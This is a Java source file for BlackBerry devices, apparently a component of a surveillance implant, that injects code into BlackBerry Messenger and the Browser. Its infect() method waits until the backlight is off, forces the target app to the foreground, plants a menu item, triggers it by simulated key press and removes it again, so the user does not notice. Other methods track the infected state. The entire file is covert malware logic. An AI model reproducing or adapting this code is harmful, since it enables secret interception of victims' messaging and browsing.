//#preprocess
package blackberry.injection;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.agent.im.AppInjectorBBM;
import blackberry.agent.url.AppInjectorBrowser;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Check;
import blackberry.utils.Utils;

public class AppInjector {
    public static final int APP_BBM = 1;
    public static final int APP_BROWSER = 2;
    //#ifdef DEBUG
    private static Debug debug = new Debug("AppInjector", DebugLevel.VERBOSE);
    //#endif

    private AppInjectorInterface delegate;

    ApplicationManager manager = ApplicationManager.getApplicationManager();

    public AppInjector(int app) throws Exception {
        if (app == APP_BBM) {
            //#ifdef DEBUG
            debug.trace("AppInjector BBM");
            //#endif
            delegate = AppInjectorBBM.getInstance();
        } else if (app == APP_BROWSER) {
            //#ifdef DEBUG
            debug.trace("AppInjector BROWSER");
            //#endif
            delegate = AppInjectorBrowser.getInstance();
        } else {
            //#ifdef DEBUG
            debug.error("AppInjector, wrong value: " + app);
            //#endif
            throw new Exception();
        }
    }

    public boolean callMenuByKey() {
        //#ifdef DEBUG
        debug.trace("callMenu");
        //#endif

        final int foregroundProcess = manager.getForegroundProcessId();

        // debug.trace("searching Messenger or Browser");
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {

            if (manager.getProcessId(apps[i]) == foregroundProcess) {
                //#ifdef DEBUG
                debug.trace("callMenuByKey foreground: " + apps[i].getName());
                //#endif

                if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
                    delegate.callMenuByKey();
                }
            }
        }
        return false;
    }

    public boolean isInfected() {

        boolean infected = delegate.isInfected();
        //#ifdef DEBUG
        //debug.trace("isInfected: " + infected);
        //#endif
        return infected;
    }

    public void callMenuInContext() {
        //#ifdef DEBUG
        debug.trace("callInContext");
        //#endif

        //#ifdef DBC
        Check.requires(delegate != null, "callMenuInContext: null delegate");
        //#endif

        if (delegate.isInfected()) {
            delegate.callMenuInContext();
        } else {
            //#ifdef DEBUG
            debug.error("callMenuInContext: not infected");
            //#endif
        }
    }

    public void infect() {
        //#ifdef DEBUG
        debug.trace("infect");
        //#endif
        
        Utils.sleep(delegate.getDelay());
        if(Backlight.isEnabled()  || isInfected()){
            //#ifdef DEBUG
            debug.trace("infected or backlight, bailing out");
            //#endif
            return;
        }
        
        int req = requestForeground();
        Utils.sleep(100);
        boolean fore = checkForeground();

        if (fore) {
            Utils.sleep(100);
            delegate.injectMenu();
            Utils.sleep(100);
            callMenuByKey();
            Utils.sleep(100);
            delegate.deleteMenu();
            Utils.sleep(100);

            if (req == 2 && checkForeground()) {
                //KeyInjector.pressKeyCode(Keypad.KEY_ESCAPE);
                //KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
            }
            
            if (req == 2 && checkForeground()) {
               manager.requestForegroundForConsole();
            }
        }
    }

    private boolean checkForeground() {
        int foregroundPin = manager.getForegroundProcessId();
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {
            if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
                int processId = manager.getProcessId(apps[i]);

                if (foregroundPin == processId) {
                    Screen screen = UiApplication.getUiApplication().getActiveScreen();
                    //#ifdef DEBUG
                    debug.trace("checkForeground, acrive screen: " + screen);
                    //#endif
                    return true;
                } else {
                    return false;
                }
            }
        }
        return false;
    }

    private int requestForeground() {
        int foregroundPin = manager.getForegroundProcessId();
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {
            if (apps[i].getName().indexOf(delegate.getAppName()) >= 0) {
                int processId = manager.getProcessId(apps[i]);

                if (foregroundPin == processId) {
                    //#ifdef DEBUG
                    debug.trace("requestForeground: already foreground");
                    //#endif
                    return 1;
                } else {
                    //#ifdef DEBUG
                    debug.trace("requestForeground: bringing foreground");
                    //#endif
                    manager.requestForeground(processId);
                    return 2;
                }

            }
        }

        return 0;
    }

}
